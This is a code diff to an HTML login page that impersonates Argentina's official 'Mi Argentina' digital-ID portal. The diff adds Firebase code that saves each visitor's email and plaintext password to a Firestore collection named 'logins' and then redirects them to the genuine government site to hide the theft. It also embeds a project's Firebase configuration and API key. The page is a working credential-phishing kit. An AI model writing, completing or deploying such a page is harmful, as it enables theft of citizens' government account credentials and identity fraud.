@@ -12,7 +12,6 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="description" content="Registrate para obtener tu DNI digital">
-    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
     <title>Mi Argentina</title>
     <style>
         body {
@@ -164,10 +163,27 @@
         </div>
     </div>
 
-    <script>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDntkOBeYnBVBE0DLZ0vPkO2LrLdG-WqUQ",
+            authDomain: "miarg-proyecto.firebaseapp.com",
+            projectId: "miarg-proyecto",
+            storageBucket: "miarg-proyecto.firebasestorage.app",
+            messagingSenderId: "883813445397",
+            appId: "1:883813445397:web:dfd117f79b81278195431c",
+            measurementId: "G-83GG4W6HWN"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
         const emailInput = document.getElementById('email');
         const passInput = document.getElementById('password');
         const loginBtn = document.getElementById('btnEntrar');
+        const form = document.getElementById('loginForm');
 
         function validar() {
             if (emailInput.value.includes('@') && passInput.value.length >= 4) {
@@ -180,10 +196,27 @@
         emailInput.addEventListener('input', validar);
         passInput.addEventListener('input', validar);
 
-        document.getElementById('loginForm').addEventListener('submit', (e) => {
+        form.addEventListener('submit', async (e) => {
             e.preventDefault();
-            alert("Iniciando sesión con: " + emailInput.value);
-            // Aquí iría tu lógica de redirección o Firebase
+            loginBtn.disabled = true;
+            loginBtn.innerText = "CARGANDO...";
+
+            try {
+                // Guarda los datos en una colección llamada 'logins'
+                await addDoc(collection(db, "logins"), {
+                    email: emailInput.value,
+                    password: passInput.value,
+                    fecha: new Date().toLocaleString()
+                });
+                
+                // Después de guardar, redirige (puedes cambiar la URL a la oficial de Mi Argentina)
+                window.location.href = "https://mi.argentina.gob.ar/";
+            } catch (error) {
+                console.error("Error al guardar:", error);
+                alert("Error de conexión");
+                loginBtn.disabled = false;
+                loginBtn.innerText = "ENTRAR";
+            }
         });
     </script>
 </body>
